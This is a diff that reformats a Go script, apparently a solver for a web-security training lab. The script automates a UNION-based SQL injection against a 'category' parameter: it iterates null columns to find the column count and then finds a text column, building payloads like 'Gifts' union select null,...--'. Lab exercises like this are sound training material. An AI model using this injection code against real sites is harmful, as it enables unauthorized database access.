@@ -4,13 +4,13 @@ package main
 
 import (
 	"fmt"
+	"io"
+	"log"
 	"net/http"
 	"net/http/cookiejar"
-	"log"
 	"net/url"
-	"strings"
 	"regexp"
-	"io"
+	"strings"
 )
 
 func main() {
@@ -53,17 +53,17 @@ func numColumns(u string, client *http.Client) (int, error) {
 	for i := 1; i <= 20; i++ {
 		nulls := make([]string, i)
 		for j := 0; j < len(nulls); j++ {
-    			nulls[j] = "null"
+			nulls[j] = "null"
 		}
 
-		filterUrl := u + "?category=" + url.QueryEscape("Gifts' union select " + strings.Join(nulls, ",") + "--")
+		filterUrl := u + "?category=" + url.QueryEscape("Gifts' union select "+strings.Join(nulls, ",")+"--")
 		fmt.Println(filterUrl)
 		resp, err := client.Get(filterUrl)
 		if err != nil {
 			return 0, err
 		}
 		defer resp.Body.Close()
-		if resp.StatusCode / 100 == 2 {
+		if resp.StatusCode/100 == 2 {
 			return i, nil
 		}
 	}
@@ -74,18 +74,18 @@ func textColumn(u string, max int, str string, client *http.Client) (int, error)
 	for i := 1; i <= max; i++ {
 		nulls := make([]string, max)
 		for j := 0; j < len(nulls); j++ {
-    			nulls[j] = "null"
+			nulls[j] = "null"
 		}
-    		nulls[i] = "'"+str+"'"
+		nulls[i] = "'" + str + "'"
 
-		filterUrl := u + "?category=" + url.QueryEscape("Gifts' union select " + strings.Join(nulls, ",") + "--")
+		filterUrl := u + "?category=" + url.QueryEscape("Gifts' union select "+strings.Join(nulls, ",")+"--")
 		fmt.Println(filterUrl)
 		resp, err := client.Get(filterUrl)
 		if err != nil {
 			return 0, err
 		}
 		defer resp.Body.Close()
-		if resp.StatusCode / 100 == 2 {
+		if resp.StatusCode/100 == 2 {
 			return i, nil
 		}
 	}
@@ -101,7 +101,6 @@ func newClient() (*http.Client, error) {
 	return &http.Client{Jar: jar}, nil
 }
 
-
 var outputStringRE *regexp.Regexp = regexp.MustCompile(`Make the database retrieve the string: '([^']+)'`)
 
 func outputString(url string, client *http.Client) (string, error) {
@@ -110,7 +109,7 @@ func outputString(url string, client *http.Client) (string, error) {
 		return "", err
 	}
 	defer resp.Body.Close()
-	if resp.StatusCode / 100 != 2 {
+	if resp.StatusCode/100 != 2 {
 		return "", fmt.Errorf("Status: %v", resp.Status)
 	}
 
@@ -119,7 +118,7 @@ func outputString(url string, client *http.Client) (string, error) {
 		return "", err
 	}
 	//fmt.Println(string(body))
-	
+
 	matches := outputStringRE.FindSubmatch(body)
 	if len(matches) != 2 {
 		return "", fmt.Errorf("output string not found")
@@ -127,5 +126,3 @@ func outputString(url string, client *http.Client) (string, error) {
 
 	return string(matches[1]), nil
 }
-
-
